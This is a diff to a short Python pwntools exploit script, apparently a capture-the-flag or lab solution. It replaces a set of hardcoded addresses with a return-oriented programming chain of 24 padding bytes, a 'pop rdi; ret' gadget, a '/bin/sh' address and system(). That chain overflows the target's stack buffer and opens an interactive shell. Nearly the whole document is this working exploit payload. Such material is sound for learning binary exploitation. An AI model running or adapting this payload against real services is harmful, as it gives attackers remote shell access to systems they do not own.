@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from os import system
 from pwngun_craft import craft
 from pwn import *
 
@@ -22,13 +23,10 @@ r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL
 
 # SPLOIT #
 
-vuln =      p64(0x401245)
-list_tmp =  p64(0x401280)
-ls =        p64(0x40201f)
-sh =        p64(0x404050)
-_system =   p64(0x401090)
-system =    p64(0x4040A0)
+pop_rdi = p64(0x0000000000401303)   # pop rdi; ret;
+system = p64(0x401090)
+binsh = p64(0x404050)
 
-r.send(ls * 3 + list_tmp + system + sh)
+r.send(b'A' * 24 + pop_rdi + binsh + system)
 
 r.interactive()
